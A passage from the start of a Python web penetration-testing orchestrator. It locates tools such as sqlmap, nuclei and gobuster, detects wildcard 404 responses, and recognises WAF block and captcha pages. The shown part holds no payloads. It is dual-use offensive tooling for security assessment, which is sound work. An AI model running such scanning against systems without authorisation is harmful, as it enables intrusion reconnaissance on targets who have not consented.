#!/usr/bin/env python3
"""
fracture.py — Web Application Penetration Testing Orchestrator

Performs comprehensive web application security assessment including
recon, TLS analysis, header inspection, crawling, injection testing,
traversal, SSRF, authentication bypass, file exposure, vulnerability
scanning, GraphQL testing, authorization testing, session analysis,
CSRF, and cross-user data leakage detection.

Works on Linux, macOS, and Windows.
"""

# ─────────────────────────────────────────────
# Standard-library imports  (always available)
# ─────────────────────────────────────────────
import sys
import os
import subprocess
import importlib
import importlib.util
import platform
import re
import random
import shutil
import argparse
import json
import csv
import socket
import threading
import signal
import atexit
import getpass
import copy
import difflib
import secrets
import statistics
import tempfile
import time
import hashlib
import urllib.parse
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

VERSION = "2.10.24"

# ── Adaptive concurrency ──────────────────────────────────────────────────────
def _hw_detect():
    """Return (logical_cpu_count, ram_gb) for the local machine."""
    _cpu = os.cpu_count() or 2
    try:
        import psutil as _ps
        _ram_gb = _ps.virtual_memory().total / (1024 ** 3)
    except ImportError:
        _ram_gb = 4.0
    return _cpu, _ram_gb

def _calc_initial_concurrency(cpu, ram_gb):
    """
    Derive a starting concurrency limit from hardware specs.
    Uses 75 % of logical CPUs, bounded by RAM (0.25 GB assumed per worker)
    and clamped to [4, 64].
    """
    return min(max(4, int(cpu * 0.75)), max(4, int(ram_gb / 0.25)), 64)

class _AdaptiveSemaphore:
    """Counting semaphore whose limit can be raised or lowered at runtime."""
    def __init__(self, initial):
        self._limit = initial
        self._count = 0
        self._cond  = threading.Condition(threading.Lock())

    def acquire(self, timeout=None):
        with self._cond:
            deadline = (time.monotonic() + timeout) if timeout else None
            while self._count >= self._limit:
                rem = (deadline - time.monotonic()) if deadline else None
                if deadline and rem <= 0:
                    return False
                self._cond.wait(timeout=rem)
            self._count += 1
            return True

    def release(self):
        with self._cond:
            if self._count > 0:
                self._count -= 1
            self._cond.notify_all()

    def set_limit(self, new_limit):
        with self._cond:
            self._limit = max(2, new_limit)
            self._cond.notify_all()

    @property
    def limit(self):
        return self._limit

    def __enter__(self):
        self.acquire()
        return self

    def __exit__(self, *_):
        self.release()

def _start_concurrency_monitor(sem, interval=10):
    """
    Daemon thread: samples CPU/RAM usage every *interval* seconds and
    nudges *sem* to keep resource pressure below 80 %.
    Requires psutil; silently no-ops if unavailable.
    """
    try:
        import psutil as _psm
    except ImportError:
        return None
    _base = sem.limit

    def _loop():
        while True:
            try:
                time.sleep(interval)
                _cpu_pct = _psm.cpu_percent(interval=2)
                _mem_pct = _psm.virtual_memory().percent
                _cur     = sem.limit
                if _cpu_pct > 80 or _mem_pct > 80:
                    sem.set_limit(max(2, int(_cur * 0.75)))
                elif _cpu_pct < 50 and _mem_pct < 60:
                    sem.set_limit(min(_base, int(_cur * 1.25)))
            except Exception:
                pass

    _t = threading.Thread(target=_loop, daemon=True, name="fr-concurrency-monitor")
    _t.start()
    return _t

_hw_cpu, _hw_ram    = _hw_detect()
_SCAN_CONCURRENCY   = _calc_initial_concurrency(_hw_cpu, _hw_ram)
_SCAN_SEM           = _AdaptiveSemaphore(_SCAN_CONCURRENCY)
# Tracks which credential role is currently being tested so that
# _write_preliminary_access_matrix stores HTTP statuses in the right column.
# Set to "unauthenticated" during pre-context recon, to the role label at the
# start of each context, and cleared ("") between targets.
_scan_ctx: dict = {"role": ""}
# All role labels (authenticated + "unauthenticated") for this scan run.
# Populated as soon as _collected_roles is known so that
# _write_preliminary_access_matrix always emits the correct column list even
# before the context loop builds _cred_contexts.  Mutated in-place.
_all_roles_ctx: list = []
# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────
# Tool discovery helpers
# ─────────────────────────────────────────────
# When Fracture is run via sudo (e.g. by Arsenal), the PATH may be minimal
# and exclude /usr/local/bin where Homebrew installs tools on macOS.
# _find_tool() falls back to known absolute paths when shutil.which() fails.


def _real_home() -> Path:
    """Return the real user's home directory even when running under sudo."""
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        try:
            import pwd
            return Path(pwd.getpwnam(sudo_user).pw_dir)
        except Exception:
            pass
    return Path.home()


_HOME = _real_home()

_TOOL_PATHS: dict = {
    "nikto": {
        "Darwin": ["/usr/local/bin/nikto", "/opt/homebrew/bin/nikto",
                   "/usr/bin/nikto", "/usr/local/Cellar/nikto/2.6.0/bin/nikto"],
        "Linux":  ["/usr/bin/nikto", "/usr/local/bin/nikto",
                   "/opt/nikto/program/nikto.pl"],
    },
    "nuclei": {
        "Darwin": ["/usr/local/bin/nuclei", "/opt/homebrew/bin/nuclei",
                   str(_HOME / "go" / "bin" / "nuclei"),
                   "/root/go/bin/nuclei"],
        "Linux":  ["/usr/local/bin/nuclei", "/usr/bin/nuclei",
                   str(_HOME / "go" / "bin" / "nuclei"),
                   "/root/go/bin/nuclei", "/opt/nuclei/nuclei"],
    },
    "gobuster": {
        "Darwin": ["/usr/local/bin/gobuster", "/opt/homebrew/bin/gobuster",
                   str(_HOME / "go" / "bin" / "gobuster"),
                   "/root/go/bin/gobuster"],
        "Linux":  ["/usr/bin/gobuster", "/usr/local/bin/gobuster",
                   "/opt/gobuster/gobuster",
                   str(_HOME / "go" / "bin" / "gobuster"),
                   "/root/go/bin/gobuster"],
    },
    "wpscan": {
        "Darwin": ["/usr/local/bin/wpscan", "/opt/homebrew/bin/wpscan"],
        "Linux":  ["/usr/bin/wpscan", "/usr/local/bin/wpscan",
                   "/opt/wpscan/bin/wpscan"],
    },
    "shcheck": {
        "Darwin": ["/opt/shcheck/shcheck.py", "/usr/local/bin/shcheck.py",
                   "/usr/local/bin/shcheck"],
        "Linux":  ["/opt/shcheck/shcheck.py", "/usr/local/bin/shcheck.py",
                   "/usr/bin/shcheck", "/usr/local/bin/shcheck"],
    },
    "sslscan": {
        "Darwin": ["/usr/local/bin/sslscan", "/opt/homebrew/bin/sslscan"],
        "Linux":  ["/usr/bin/sslscan", "/usr/local/bin/sslscan"],
    },
    "testssl.sh": {
        "Darwin": ["/opt/testssl.sh/testssl.sh", "/usr/local/bin/testssl.sh",
                   "/opt/homebrew/bin/testssl.sh"],
        "Linux":  ["/opt/testssl.sh/testssl.sh", "/usr/local/bin/testssl.sh",
                   "/usr/bin/testssl.sh"],
    },
    "feroxbuster": {
        "Darwin": ["/usr/local/bin/feroxbuster", "/opt/homebrew/bin/feroxbuster"],
        "Linux":  ["/usr/bin/feroxbuster", "/usr/local/bin/feroxbuster",
                   "/opt/feroxbuster/feroxbuster"],
    },
    "whatweb": {
        "Darwin": ["/usr/local/bin/whatweb", "/opt/homebrew/bin/whatweb",
                   "/opt/homebrew/opt/ruby/bin/whatweb",
                   str(_HOME / ".gem" / "ruby" / "bin" / "whatweb")],
        "Linux":  ["/usr/bin/whatweb", "/usr/local/bin/whatweb",
                   "/opt/whatweb/whatweb",
                   str(_HOME / ".gem" / "ruby" / "bin" / "whatweb")],
    },
    "ffuf": {
        "Darwin": ["/usr/local/bin/ffuf", "/opt/homebrew/bin/ffuf",
                   str(_HOME / "go" / "bin" / "ffuf"),
                   "/root/go/bin/ffuf"],
        "Linux":  ["/usr/bin/ffuf", "/usr/local/bin/ffuf",
                   str(_HOME / "go" / "bin" / "ffuf"),
                   "/root/go/bin/ffuf"],
    },
    "searchsploit": {
        "Darwin": ["/usr/local/bin/searchsploit", "/opt/homebrew/bin/searchsploit",
                   "/opt/exploitdb/searchsploit"],
        "Linux":  ["/usr/bin/searchsploit", "/usr/local/bin/searchsploit",
                   "/opt/exploitdb/searchsploit"],
    },
    "sqlmap": {
        "Darwin": ["/usr/local/bin/sqlmap", "/opt/homebrew/bin/sqlmap",
                   "/opt/sqlmap/sqlmap.py"],
        "Linux":  ["/usr/bin/sqlmap", "/usr/local/bin/sqlmap",
                   "/opt/sqlmap/sqlmap.py"],
    },
    "dalfox": {
        "Darwin": ["/usr/local/bin/dalfox", "/opt/homebrew/bin/dalfox",
                   str(_HOME / "go" / "bin" / "dalfox"),
                   "/root/go/bin/dalfox"],
        "Linux":  ["/usr/bin/dalfox", "/usr/local/bin/dalfox",
                   str(_HOME / "go" / "bin" / "dalfox"),
                   "/root/go/bin/dalfox"],
    },
    "jwt_tool": {
        "Darwin": ["/opt/jwt_tool/jwt_tool.py", "/usr/local/bin/jwt_tool",
                   "/usr/local/bin/jwt_tool.py"],
        "Linux":  ["/opt/jwt_tool/jwt_tool.py", "/usr/local/bin/jwt_tool",
                   "/usr/bin/jwt_tool", "/usr/local/bin/jwt_tool.py"],
    },
}


_GEM_TOOLS = {"whatweb", "wpscan"}


def _find_tool(name: str) -> "str | None":
    """Return path to *name*, checking PATH then known absolute locations."""
    found = shutil.which(name)
    if found:
        return found
    for p in _TOOL_PATHS.get(name, {}).get(platform.system(), []):
        if Path(p).exists():
            return p
    # Fallback: ask gem for its directories (covers versioned/user gem installs)
    if name in _GEM_TOOLS:
        for gem in filter(None, [shutil.which("gem"), "/usr/local/bin/gem",
                                  "/opt/homebrew/bin/gem", "/usr/bin/gem"]):
            if not Path(gem).exists():
                continue
            try:
                env_out = subprocess.run([gem, "environment"],
                                         capture_output=True, text=True, timeout=5)
                if env_out.returncode == 0:
                    in_gem_paths = False
                    for line in env_out.stdout.splitlines():
                        # EXECUTABLE DIRECTORY: /usr/local/bin
                        if "EXECUTABLE DIRECTORY:" in line:
                            exec_dir = line.split(":", 1)[1].strip()
                            candidate = Path(exec_dir) / name
                            if candidate.exists():
                                return str(candidate)
                            in_gem_paths = False
                        # GEM PATHS: section — each indented line is a path
                        elif "GEM PATHS:" in line:
                            in_gem_paths = True
                        elif in_gem_paths:
                            gem_path = line.strip().lstrip("- ")
                            if not gem_path or gem_path.startswith("-"):
                                in_gem_paths = False
                                continue
                            candidate = Path(gem_path) / "bin" / name
                            if candidate.exists():
                                return str(candidate)
            except Exception:
                pass
            break  # only try the first usable gem binary found
    return None


# Flat wordlist directory populated by fracture's install.py --wordlists phase.
# macOS: /usr/share is SIP-protected; use /usr/local/share/wordlists instead.
_WORDLISTS_DIR = (
    Path("C:/wordlists")               if platform.system() == "Windows"
    else Path("/usr/local/share/wordlists") if platform.system() == "Darwin"
    else Path("/usr/share/wordlists")
)

_SECLISTS_BASES = [
    "/usr/share/seclists",
    "/usr/local/share/seclists",        # Intel Mac Homebrew
    "/opt/homebrew/share/seclists",     # Apple Silicon Homebrew
    "/usr/share/wordlists/seclists",
    "/opt/seclists",
]


def _find_wordlist(rel_path: str, cfg_override: str = "") -> str:
    """Return an existing wordlist path.

    Search order:
      1. cfg_override (or rel_path) if it exists directly.
      2. _WORDLISTS_DIR / basename(rel_path)  — flat dir installed by install.py.
      3. Each _SECLISTS_BASES entry / rel_path — full seclists install.
      4. Falls back to _WORDLISTS_DIR / basename so missing-path messages are
         consistent and point to the canonical install location.
    """
    primary = cfg_override or rel_path
    if Path(primary).exists():
        return primary
    basename = Path(rel_path).name
    flat = _WORDLISTS_DIR / basename
    if flat.exists():
        return str(flat)
    for base in _SECLISTS_BASES:
        candidate = Path(base) / rel_path
        if candidate.exists():
            return str(candidate)
    return str(flat)


def _find_shcheck() -> "str | None":
    """Return path to shcheck (may be a .py script)."""
    return _find_tool("shcheck") or _find_tool("shcheck.py")


def _clients_base() -> Path:
    """Return the OS-appropriate default parent directory for client project folders."""
    system = platform.system()
    if system == "Windows":
        base = Path("C:/clients")
    elif system == "Darwin":
        base = Path("/Users/Shared/clients")
    else:
        base = Path("/clients")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _build_project_dir(client_short: str, start_date: str, tool_name: str) -> Path:
    """
    Build a structured project directory:
      <clients_base>/<client_short>/<year>/<tool_name>/<client_short>_<datetime>/
    """
    slug = re.sub(r'[^\w-]', '_', (client_short or 'client').strip().lower()).strip('_') or 'client'
    year = (start_date[:4] if start_date and len(start_date) >= 4 and start_date[:4].isdigit()
            else datetime.now().strftime('%Y'))
    dt_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    path = _clients_base() / slug / year / tool_name / f"{slug}_{dt_str}"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_project_meta(project_dir: Path, tool: str, client_short: str,
                        year: str, version: str) -> None:
    """Write project_meta.json so Flask apps can discover this project."""
    try:
        (project_dir / "project_meta.json").write_text(
            json.dumps({
                "tool":         tool,
                "client_short": client_short,
                "year":         year,
                "created_at":   datetime.now().isoformat(),
                "version":      version,
                "hostname":     socket.gethostname(),
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# Finding title normalisation
# ─────────────────────────────────────────────────────────────────────────────
_TITLE_NORM_SUBS = [
    (re.compile(r'TLSv?[\s_]?1\.?0',     re.IGNORECASE), 'TLS 1.0'),
    (re.compile(r'TLSv?[\s_]?1\.?1',     re.IGNORECASE), 'TLS 1.1'),
    (re.compile(r'SSLv?[\s_]?2(?:\.0)?', re.IGNORECASE), 'SSLv2'),
    (re.compile(r'SSLv?[\s_]?3(?:\.0)?', re.IGNORECASE), 'SSLv3'),
]

# ─────────────────────────────────────────────
# Generic-404 / catch-all baseline helpers
# ─────────────────────────────────────────────

# ── Wildcard / catch-all detection ───────────────────────────────────────────
#
# Strategy: send 3 probes to randomly-generated paths that cannot plausibly
# exist on the target.  If all probes agree on status code AND their normalised
# bodies are structurally similar, the server is treating every path as valid
# (wildcard / catch-all behaviour).
#
# Two layers of similarity are checked:
#   • body-length ratio — size difference relative to the larger body
#   • word-count ratio  — same idea on token count
#   • SequenceMatcher ratio — structural diff on the first 8 KB (after stripping
#     the injected probe path so reflection doesn't fool the comparison)
#
# At least 2 of the 3 signals must exceed their thresholds before a wildcard is
# declared.  The returned baseline dict is consumed by _is_wildcard_match() to
# filter individual URLs found by crawl, admin-panel detection, etc.

_WC_LEN_TOLERANCE    = 0.08   # 8 % body-length difference
_WC_WORD_TOLERANCE   = 0.10   # 10 % word-count difference
_WC_SIMILARITY_RATIO = 0.88   # difflib SequenceMatcher ratio threshold
_WC_PARENT_THRESHOLD = 5      # min hits under same parent to trigger per-path wildcard probe
_WC_SAMPLE_SIZE      = 8192   # bytes fed to SequenceMatcher (cap for O(n²))


def _wc_body_fp(text: str, probe_paths: "list[str]") -> dict:
    """Return a multi-signal fingerprint of *text* after stripping injected probe paths."""
    norm = text
    for p in probe_paths:
        if not p:
            continue
        # Strip bare path and URL-encoded variant so reflection doesn't skew comparison
        norm = norm.replace(p, "__WC_PROBE__")
        norm = norm.replace(urllib.parse.quote(p), "__WC_PROBE__")
        norm = norm.replace(urllib.parse.quote(p, safe=""), "__WC_PROBE__")
    sample = norm[:_WC_SAMPLE_SIZE]
    return {
        "hash":   hashlib.md5(sample.encode("utf-8", errors="replace")).hexdigest(),
        "words":  len(norm.split()),
        "lines":  norm.count("\n") + 1,
        "length": len(norm),
        "sample": sample,
    }


def _detect_wildcard(base_url: str, sess: "requests.Session",
                     timeout: int = 10) -> "dict | None":
    """Probe *base_url* with three random paths to detect catch-all/wildcard behaviour.

    Returns a baseline dict when wildcard is confirmed, or None when the server
    responds normally (404/410 for nonexistent paths, or probe responses differ).

    The returned dict is passed to _is_wildcard_match() to classify responses
    from crawl, admin-panel detection, file-exposure, and brute-force phases.
    When a wildcard is confirmed, directory brute-forcers (gobuster/feroxbuster)
    are skipped entirely since every path would appear to exist.
    """
    base = base_url.rstrip("/")

    # Three probes with different shapes to defeat path-aware logic and caches
    probe_paths = [
        f"/{secrets.token_hex(12)}-notfound",
        f"/nonexistent-{secrets.token_hex(8)}/deep/{secrets.token_hex(6)}.html",
        f"/{secrets.token_hex(14)}.php",
    ]

    responses: list = []
    for path in probe_paths:
        try:
            r = sess.get(base + path, timeout=timeout, allow_redirects=False)
            responses.append((path, r))
        except Exception:
            pass  # network error on one probe is not conclusive

    if len(responses) < 2:
        return None  # not enough data to determine

    # All available probes must agree on status code
    statuses = [r.status_code for _, r in responses]
    if len(set(statuses)) != 1:
        return None  # probes disagree → not a uniform wildcard

    status = statuses[0]

    # Legitimate 404/410 → clean server → not a wildcard
    if status in (404, 410):
        return None

    # Redirect wildcard: every unknown path redirects to the same destination.
    # Many servers embed the probe path in the Location query string
    # (e.g. /404?from=/abc123-notfound), so we compare only the path portion.
    if status in (301, 302, 303, 307, 308):
        locations = [r.headers.get("Location", "") for _, r in responses]
        # Exact match first
        if len(set(locations)) == 1 and locations[0]:
            return {
                "status":         status,
                "location":       locations[0],
                "location_exact": True,
                "body_len":       0.0,
                "word_count":     0.0,
                "line_count":     0.0,
                "body_hash":      "",
                "sample":         "",
                "probe_paths":    probe_paths,
                "redirect":       True,
            }
        # Path-only match (ignores probe path embedded in query string)
        loc_paths = [urllib.parse.urlparse(loc).path for loc in locations if loc]
        if loc_paths and len(set(loc_paths)) == 1:
            return {
                "status":         status,
                "location":       loc_paths[0],
                "location_exact": False,
                "body_len":       0.0,
                "word_count":     0.0,
                "line_count":     0.0,
                "body_hash":      "",
                "sample":         "",
                "probe_paths":    probe_paths,
                "redirect":       True,
            }
        return None  # redirects differ → not uniform

    # For 200/403/other: compare body fingerprints across all probe pairs.
    # Using all pairs (not just fps[0] vs fps[1]) makes detection stable when
    # one probe response has dynamic content (timestamp, nonce) that slightly
    # differs from the others — a majority agreement across pairs confirms the
    # wildcard even when one individual pair falls below a threshold.
    fps   = [_wc_body_fp(r.text, probe_paths) for _, r in responses]
    pairs = [(i, j) for i in range(len(fps)) for j in range(i + 1, len(fps))]

    def _ratio_ok(a: float, b: float, tol: float) -> bool:
        mx = max(a, b, 1)
        return abs(a - b) / mx < tol

    def _majority(matches: int, total: int) -> bool:
        """True when strictly more than half of pairs match."""
        return matches * 2 > total

    votes = 0

    # Signal 1 — body length ratio: majority of pairs must agree
    len_matches = sum(
        _ratio_ok(fps[i]["length"], fps[j]["length"], _WC_LEN_TOLERANCE)
        for i, j in pairs
    )
    if _majority(len_matches, len(pairs)):
        votes += 1

    # Signal 2 — word count ratio: majority of pairs must agree
    word_matches = sum(
        _ratio_ok(fps[i]["words"], fps[j]["words"], _WC_WORD_TOLERANCE)
        for i, j in pairs
    )
    if _majority(word_matches, len(pairs)):
        votes += 1

    # Signal 3 — structural similarity via SequenceMatcher: majority of pairs
    sm_matches = sum(
        difflib.SequenceMatcher(
            None, fps[i]["sample"], fps[j]["sample"], autojunk=True
        ).ratio() >= _WC_SIMILARITY_RATIO
        for i, j in pairs
    )
    if _majority(sm_matches, len(pairs)):
        votes += 1

    if votes < 2:
        return None  # probes differ enough — not a wildcard

    # Wildcard confirmed.  Build a representative baseline from the available probes.
    lengths = [f["length"] for f in fps]
    words   = [f["words"]  for f in fps]
    lines   = [f["lines"]  for f in fps]
    med_len = statistics.median(lengths)
    # Use the probe closest to the median length as the representative sample
    rep_idx = min(range(len(fps)), key=lambda i: abs(fps[i]["length"] - med_len))

    return {
        "status":      status,
        "location":    None,
        "body_len":    med_len,
        "word_count":  statistics.median(words),
        "line_count":  statistics.median(lines),
        "body_hash":   fps[rep_idx]["hash"],
        "sample":      fps[rep_idx]["sample"],
        "probe_paths": probe_paths,
        "redirect":    False,
    }


def _is_wildcard_match(r: "requests.Response",
                       baseline: "dict | None") -> bool:
    """Return True when *r* matches the wildcard baseline (i.e. is a false positive).

    Called by admin-panel detection, file-exposure checks, crawl endpoint
    validation, and any other module that needs to confirm a URL is genuinely
    distinct from the server's catch-all response.

    Intentionally conservative: requires 2 of 3 independent signals to agree
    before discarding a candidate, to avoid silencing real findings.
    """
    if baseline is None:
        return False

    if r.status_code != baseline["status"]:
        return False

    # Redirect wildcard: same destination = same catch-all redirect.
    # Exact match when the baseline was built from identical Location headers;
    # path-only match when the probe path was embedded in the query string.
    if baseline.get("redirect"):
        loc = r.headers.get("Location", "")
        if baseline.get("location_exact"):
            return loc == baseline["location"]
        return urllib.parse.urlparse(loc).path == baseline["location"]

    probe_paths = baseline.get("probe_paths", [])
    fp = _wc_body_fp(r.text, probe_paths)

    # Fast path: normalised hash is identical
    if fp["hash"] == baseline["body_hash"]:
        return True

    def _ratio_ok(a: float, b: float, tol: float) -> bool:
        mx = max(a, b, 1)
        return abs(a - b) / mx < tol

    votes = 0

    bl = baseline["body_len"]
    if bl > 0:
        if _ratio_ok(fp["length"], bl, _WC_LEN_TOLERANCE):
            votes += 1
    elif fp["length"] < 50:
        votes += 1  # both effectively empty

    bw = baseline["word_count"]
    if bw > 0:
        if _ratio_ok(fp["words"], bw, _WC_WORD_TOLERANCE):
            votes += 1
    elif fp["words"] < 5:
        votes += 1

    if baseline["sample"]:
        sm_ratio = difflib.SequenceMatcher(
            None, fp["sample"], baseline["sample"], autojunk=True
        ).ratio()
        if sm_ratio >= _WC_SIMILARITY_RATIO:
            votes += 1

    return votes >= 2


def _filter_buster_wildcards(
    results: "list[tuple[str, int | None, str | None]]",
    sess: "requests.Session",
    timeout: int,
) -> "list[tuple[str, int | None, str | None]]":
    """Suppress per-path wildcard false positives from gobuster/feroxbuster output.

    First performs a global check: if ALL results share the same non-404/410 status
    code (and optionally the same redirect destination), probes the server root with
    random paths to confirm a server-wide catch-all.  If confirmed, every result is
    suppressed — the tool is reporting uniform responses for everything it tried.

    Then performs a per-directory check: groups results by parent directory.  For
    any parent with ≥_WC_PARENT_THRESHOLD entries sharing a uniform non-404/410
    status code, probes the parent URL with _detect_wildcard().  Entries whose
    parent is confirmed as a catch-all are dropped and a log message is emitted.
    Other entries pass through unchanged.
    """
    if not results:
        return results

    # ── Global uniform-response check ─────────────────────────────────────────
    # If every result shares exactly one non-404/410 status code AND every redirect
    # destination is the same (when present), the server is likely returning the
    # same catch-all for all probed paths.  Confirm with a random-path probe at the
    # server root before suppressing, so legitimate all-403 scenarios (e.g. auth
    # wall on a specific subtree) are not incorrectly discarded.
    _global_statuses = [s for _, s, _ in results if s is not None]
    _global_redirects = [rd for _, _, rd in results if rd is not None]
    _uniform_status = (
        len(_global_statuses) >= _WC_PARENT_THRESHOLD
        and len(set(_global_statuses)) == 1
        and _global_statuses[0] not in (404, 410)
    )
    _uniform_redirect = (
        _uniform_status
        and bool(_global_redirects)
        and len(set(_global_redirects)) == 1
        and len(_global_redirects) == len(results)
    )
    if _uniform_status:
        _wc_global = None
        _root_url  = ""
        try:
            _sp = urllib.parse.urlparse(results[0][0])
            _root_url = f"{_sp.scheme}://{_sp.netloc}"
            _wc_global = _detect_wildcard(_root_url, sess, timeout)
        except Exception:
            pass
        if _wc_global is not None:
            _reason = (
                f"uniform HTTP {_global_statuses[0]} + redirect → {_global_redirects[0]}"
                if _uniform_redirect
                else f"uniform HTTP {_global_statuses[0]}"
            )
            vc.log(
                f"[buster-filter] All {len(results)} result(s) share {_reason} and "
                f"server returns the same catch-all for random paths — suppressing all",
                "WARN",
            )
            return []

        # Status-only fallback: _detect_wildcard requires body similarity and can
        # miss wildcards when the server embeds session IDs / timestamps in its
        # error pages (e.g. Java servlet containers returning 403 for all unknown
        # paths).  If ≥2 of 3 HEAD probes on random paths return the same uniform
        # status, the server is a catch-all regardless of body variance.
        if _root_url:
            _so_hits = 0
            _so_needed = _global_statuses[0]
            for _ in range(3):
                try:
                    _so_r = sess.head(
                        _root_url + "/" + secrets.token_hex(12) + "-notfound",
                        timeout=max(timeout // 2, 3),
                        allow_redirects=False,
                    )
                    if _so_r.status_code == _so_needed:
                        _so_hits += 1
                except Exception:
                    pass
            if _so_hits >= 2:
                vc.log(
                    f"[buster-filter] All {len(results)} result(s) share HTTP {_so_needed} "
                    f"and status-only probes confirm catch-all (body detection was inconclusive)"
                    f" — suppressing all",
                    "WARN",
                )
                return []

    from collections import defaultdict

    groups: dict = defaultdict(list)
    for entry in results:
        url, status, redirect = entry
        try:
            parsed = urllib.parse.urlparse(url)
            parts  = parsed.path.rstrip("/").rsplit("/", 1)
            parent_path = parts[0] if (len(parts) > 1 and parts[0]) else "/"
            parent_url  = f"{parsed.scheme}://{parsed.netloc}{parent_path}"
        except Exception:
            parent_url = ""
        groups[parent_url].append(entry)

    # Cache per-parent wildcard probes so each parent URL is only probed once
    # even when multiple status codes at the same parent exceed the threshold.
    _parent_wc_cache: dict = {}

    kept: list = []
    for parent_url, group_entries in groups.items():
        # Bucket entries by status code.  This lets us detect the common case
        # where a mix of real results (302 redirects, 200 pages) and wildcard
        # responses (hundreds of identical 403s for !Admin, !Archive, etc.) live
        # under the same parent — previously the uniform-status requirement would
        # prevent any filtering because the statuses weren't all the same.
        sc_buckets: dict = defaultdict(list)
        for entry in group_entries:
            _, s, _ = entry
            if s is not None and s not in (404, 410):
                sc_buckets[s].append(entry)

        # For each status code that appears ≥ _WC_PARENT_THRESHOLD times, probe
        # the parent directory.  If _detect_wildcard confirms that the server
        # returns that same status for random paths, re-fetch every entry with
        # that status and compare its body against the wildcard baseline.
        # Entries whose body matches the baseline are false positives; entries
        # with a genuinely different body (a real restricted page) are kept.
        _handled_ids: set = set()

        for sc, sc_entries in sc_buckets.items():
            if len(sc_entries) < _WC_PARENT_THRESHOLD or not parent_url:
                continue
            if parent_url not in _parent_wc_cache:
                try:
                    _parent_wc_cache[parent_url] = _detect_wildcard(
                        parent_url, sess, timeout)
                except Exception:
                    _parent_wc_cache[parent_url] = None
            wc = _parent_wc_cache[parent_url]
            if wc is None or wc["status"] != sc:
                continue
            vc.log(
                f"[buster-filter] Per-path wildcard at {parent_url} "
                f"(HTTP {sc} catch-all) — validating {len(sc_entries)} result(s)",
                "INFO",
            )
            _suppressed = 0
            for entry in sc_entries:
                _handled_ids.add(id(entry))
                eu = entry[0]
                try:
                    _rv = sess.get(
                        eu, timeout=max(timeout // 2, 3),
                        allow_redirects=False,
                        headers={"Accept": "text/html,application/json"},
                    )
                    if _is_wildcard_match(_rv, wc):
                        _suppressed += 1
                        continue
                except Exception:
                    pass
                kept.append(entry)
            if _suppressed:
                vc.log(
                    f"[buster-filter] Suppressed {_suppressed}/{len(sc_entries)} "
                    f"wildcard-matching HTTP {sc} result(s) at {parent_url}",
                    "INFO",
                )

        # Keep every entry that was not identified as a wildcard false positive
        for entry in group_entries:
            if id(entry) not in _handled_ids:
                kept.append(entry)

    return _filter_dominant_code(kept, sess, timeout)


# ── Dead-endpoint / dominant-code source-validation filter ───────────────────
#
# If >80 % of buster/fuzzer results share the same HTTP status code the server
# is likely returning a catch-all response for non-existent paths rather than
# reporting real findings.  Each dominant-code entry is re-fetched and its
# response body is inspected for 404-indicating content.  Entries whose source
# confirms a dead / non-existent resource are dropped; entries with genuinely
# different content are kept.  Entries with non-dominant codes pass through
# unconditionally.

_WC_DOMINANT_RATIO   = 0.80   # trigger threshold (>80 % share same code)
_WC_DEAD_MIN_TEXT    = 100    # visible text shorter than this → dead endpoint

# WAF/CDN block-page detection — used to suppress false-positive 403 results when
# a security scanner is rate-limited or IP-blocked by a WAF/CDN mid-scan (e.g.
# Akamai blocking gobuster after detecting scan traffic, then blocking the whole
# scanner IP so subsequent session re-fetches also return 403).
_WAF_SERVER_RE = re.compile(
    r"\b(akamaighost|akamai|cloudflare|awswaf|imperva|incapsula|"
    r"barracuda|sucuri|modsecurity|bigip|citrix-adc|f5)\b",
    re.I,
)
_WAF_BODY_RE = re.compile(
    # Akamai — Reference # error ID and explicit branding
    r"reference\s*#\s*[\d.]+|"
    r"\bakamai(?:ghost|error)?\b|"
    # Cloudflare
    r"\bcf-ray\b|__cf_bm\b|cloudflare\b.*(?:blocked|denied)|"
    # Generic WAF/CDN block language
    r"this request has been blocked|"
    r"your (?:IP )?(?:address )?has been blocked|"
    r"you have been blocked|"
    r"access to this (?:site|page|resource) has been (?:blocked|denied)|"
    r"security service.*(?:block|protect)|"
    r"automated (?:tool|scan|request|access|bot)\b|"
    r"suspicious (?:activity|request|traffic)",
    re.I,
)

# WAF session-health detection — login redirect and challenge patterns
_WAF_LOGIN_URL_RE = re.compile(
    r"(?:^|[/?&])(?:login|signin|sign-in|logon|log-in|authenticate?|sso|"
    r"session[_-]?expired|account[_-]?locked|access[_-]?denied)",
    re.I,
)
_WAF_LOGIN_BODY_RE = re.compile(
    r"<input[^>]+(?:name|id)=[\"']password[\"']|"
    r"(?:session|account).{0,40}(?:expired|timed.?out|terminated|invalid)|"
    r"(?:you have been|your session has been).{0,30}(?:logged out|signed out|expired|terminated)|"
    r"please (?:log in|sign in|authenticate) (?:again|to continue)",
    re.I,
)
_WAF_CHALLENGE_RE = re.compile(
    r"captcha|i am not a robot|robot check|__cf_chl|px-captcha|"
    r"datadome\.co/captcha|kasada\.io|_pxParam|arkoselabs\.com|"
    r"js-challenge|javascript required.*blocked|challenge.*complete",
    re.I,
)

_DEAD_TITLE_RE = re.compile(
    r"<title[^>]*>[^<]*"
    r"(404|not\s+found|page\s+not\s+found|file\s+not\s+found|"
    r"resource\s+not\s+found|does?\s*n[o']t\s+exist|"
    r"no\s+longer\s+(available|exists?)|error\s+404|"
    r"oops[!,.]|we\s+can.t\s+find|nothing\s+here)"
    r"[^<]*</title>",
    re.I | re.S,
)

_DEAD_BODY_PHRASES: tuple = (
    "page not found",
    "resource not found",
    "file not found",
    "the page you requested could not be found",
    "the requested url was not found",
    "the requested resource could not be found",
    "this page doesn't exist",
    "this page does not exist",
    "this url doesn't exist",
    "this url does not exist",
    "no longer available",
    "no longer exists",
    "content not found",
    "couldn't find what you were looking for",
    "can't find the page",
    "cannot find the page",
    "we couldn't find that page",
    "we can't find that page",
    "sorry, we can't find",
    "sorry, the page you were looking for",
    "oops! that page can't be found",
    "oops, that page was not found",
    "hmm. we're having trouble finding that site",
    "404 error",
    "error 404",
    "http 404",
    "nothing here",
    "the page could not be found",
    "there is nothing here",
)


def _is_dead_endpoint_body(text: str) -> bool:
    """Return True if *text* (raw HTTP response body) indicates a dead or
    non-existent endpoint — i.e. the server is serving a 404-equivalent page
